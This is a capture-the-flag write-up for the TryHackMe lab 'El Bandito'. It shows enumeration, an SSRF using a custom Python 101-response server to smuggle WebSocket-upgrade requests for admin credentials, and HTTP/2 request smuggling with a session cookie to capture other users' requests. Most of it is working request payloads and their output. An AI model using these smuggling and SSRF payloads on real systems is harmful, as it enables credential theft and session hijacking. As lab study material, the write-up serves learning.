# Enumeration

## Nmap

```bash
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 27:3c:48:92:a1:13:77:45:ca:c8:63:d4:9d:b1:e0:fa (RSA)

80/tcp   open  ssl/http syn-ack ttl 60 El Bandito Server
|_http-server-header: El Bandito Server
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Date: Sat, 24 May 2025 10:17:18 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     X-XSS-Protection: 1; mode=block
|     Feature-Policy: microphone 'none'; geolocation 'none';
|     Age: 0
|     Server: El Bandito Server
|     src='/static/messages.js'

631/tcp  open  ipp      syn-ack ttl 61 CUPS 2.4
|_http-server-header: CUPS/2.4 IPP/2.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Forbidden - CUPS v2.4.7

8080/tcp open  http     syn-ack ttl 60 nginx
|_http-favicon: Spring Java Framework
|_http-title: Site doesn't have a title (application/json;charset=UTF-8).
```

## SSH (22)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh root@10.10.55.73
root@10.10.55.73: Permission denied (publickey).
```

## HTTP (80, 8080)

### Gobuster (80)

```bash
/access
/login
```

### Dirsearch (8080)

```bash
[06:18:53] 200 -    0B  - /assets                                           
[06:18:53] 200 -    0B  - /assets/
[06:19:08] 200 -   12KB - /configprops
[06:19:23] 200 -  946B  - /favicon.ico                                      
[06:19:29] 200 -  150B  - /health                                           
[06:19:29] 200 -  150B  - /health.json
[06:19:35] 200 -    2B  - /info                                             
[06:19:35] 200 -    2B  - /info.json                                        
[06:19:48] 200 -   11MB - /heapdump                                         
[06:19:50] 200 -    4KB - /mappings.json                                    
[06:19:50] 200 -   11MB - /heapdump.json                                    
[06:19:50] 200 -    4KB - /mappings                                         
[06:19:54] 403 -  548B  - /metrics                                          
[06:19:54] 403 -  548B  - /metrics.json                                     
[06:19:54] 403 -  548B  - /metrics/                                         
[06:20:35] 200 -    3KB - /swagger-ui.html
```

### Website Functionality

```bash
GET /mappings HTTP/1.1
```

- hacktrick
    
    ```bash
    https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html?highlight=spring%20boot%20actuators#exploiting-spring-boot-actuators
    ```
    
    ![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/EL%20Bandito%20(THM)/Images/image%20(1).png?raw=true)
    

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/EL%20Bandito%20(THM)/Images/image%20(3).png?raw=true)

```bash
/admin-creds
/admin-flag
/isOnline
```

Payload- save myserver.py

- python3 [myserver.py](http://myserver.py/) 5555

```bash
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

```bash
GET /isOnline?url=http://10.4.9.248:5555/test.txt HTTP/1.1
Host: bandito.thm:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
If-Modified-Since: Wed, 20 Mar 2024 23:10:13 GMT
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/EL%20Bandito%20(THM)/Images/image%20(4).png?raw=true)

- remove content-length

!!!!!!!!!!!!!!!!! `Add two new lines at the end (eg. 10, 11)` !!!!!!!!!!!!!!!!!!!!!!
REQUEST (try at burp)

```bash
GET /isOnline?url=http://10.4.9.248:5555 HTTP/1.1
Host: bandito.thm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Sec-WebSocket-Version: 13
Upgrade: WebSocket

GET /admin-creds HTTP/1.1
Host: bandito.thm:8080
```

REPLY

```bash
HTTP/1.1 101 
Server: nginx
Date: Sun, 25 May 2025 06:56:58 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200 
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 55
Date: Sun, 25 May 2025 06:56:58 GMT

username:hAckLIEN password:YouCanCatchUsInYourDreams404
```

# Flag 1

REQUEST

```bash
GET /isOnline?url=http://10.4.9.248:5555 HTTP/1.1
Host: bandito.thm:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Sec-WebSocket-Version: 13
Upgrade: WebSocket

GET /admin-flag HTTP/1.1
Host: bandito.thm:8080
```

REPLY

```bash
HTTP/1.1 101 
Server: nginx
Date: Sun, 25 May 2025 06:58:02 GMT
Connection: upgrade
X-Application-Context: application:8081

HTTP/1.1 200 
X-Application-Context: application:8081
Content-Type: text/plain
Content-Length: 43
Date: Sun, 25 May 2025 06:58:02 GMT

THM{:::MY_DECLINATION:+62°_14\'_31.4'':::}
```

# Flag 2

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/EL%20Bandito%20(THM)/Images/image%20(5).png?raw=true)

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/EL%20Bandito%20(THM)/Images/image%20(6).png?raw=true)

```bash
// Function to fetch messages from the server
	function fetchMessages() {
		fetch("/getMessages")
			.then((response) => {
				if (!response.ok) {
					throw new Error("Failed to fetch messages");
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/EL%20Bandito%20(THM)/Images/image%20(7).png?raw=true)

## Step1

Send them all to request

```bash
GET /messages HTTP/2
POST /send_message HTTP/2
GET /getMessages HTTP/2
```

## Step2

```bash
POST / HTTP/2
Host: bandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aDLA8A.ikjW6tDsmMlQPVTPRZKzNcy48g0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 0

GET /admin-flag HTTP/1.1
Foo:
```

![image.png](https://github.com/HeinPyaeSoneShein/CTF-Write-up/blob/main/EL%20Bandito%20(THM)/Images/image%20(8).png?raw=true)

- keep sending to find 404 error.

## Step3

```bash
POST / HTTP/2
Host: bandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aDLA8A.ikjW6tDsmMlQPVTPRZKzNcy48g0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 0

POST /send_message HTTP/1.1
Host: bandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aDLA8A.ikjW6tDsmMlQPVTPRZKzNcy48g0
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

data =
```

- wait for 503 Service Unavailable

## Step4

- send request getmessages again

```bash
GET /getMessages HTTP/2
Host: bandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aDLA8A.ikjW6tDsmMlQPVTPRZKzNcy48g0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

- You need to see `Null` in response.

## Step5

```bash
POST / HTTP/2
Host: bandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aDLA8A.ikjW6tDsmMlQPVTPRZKzNcy48g0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Length: 0

POST /send_message HTTP/1.1
Host: bandito.thm:80
Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aDLA8A.ikjW6tDsmMlQPVTPRZKzNcy48g0
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

data =
```

- send this request agin!
